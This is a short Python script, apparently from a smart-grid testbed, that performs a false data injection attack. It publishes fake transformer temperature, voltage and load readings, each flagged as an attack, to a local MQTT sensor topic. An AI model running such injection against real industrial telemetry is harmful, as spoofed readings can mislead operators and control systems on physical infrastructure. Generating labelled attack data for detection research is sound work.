#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import json
import time
import sys

BROKER = "localhost"
PORT = 1883
TOPIC = "TM1/Trafo/sensor"

def attack(attack_type, duration):
    client = mqtt.Client()
    client.connect(BROKER, PORT, 60)
    
    print(f"[FDI] Attack started: {attack_type}")
    
    start = time.time()
    while time.time() - start < duration:
        fake = {
            "timestamp": time.time(),
            "is_attack": True,
            "attack_type": attack_type
        }
        
        if attack_type == "temp":
            fake["oil_temperature"] = 95.0
        elif attack_type == "voltage":
            fake["primary_voltage"] = 140.0
        elif attack_type == "load":
            fake["load_level"] = 115.0
            
        client.publish(TOPIC, json.dumps(fake))
        time.sleep(1)
    
    print("[FDI] Attack finished")

if __name__ == "__main__":
    if len(sys.argv) > 2:
        attack(sys.argv[1], int(sys.argv[2]))
    else:
        attack("temp", 10)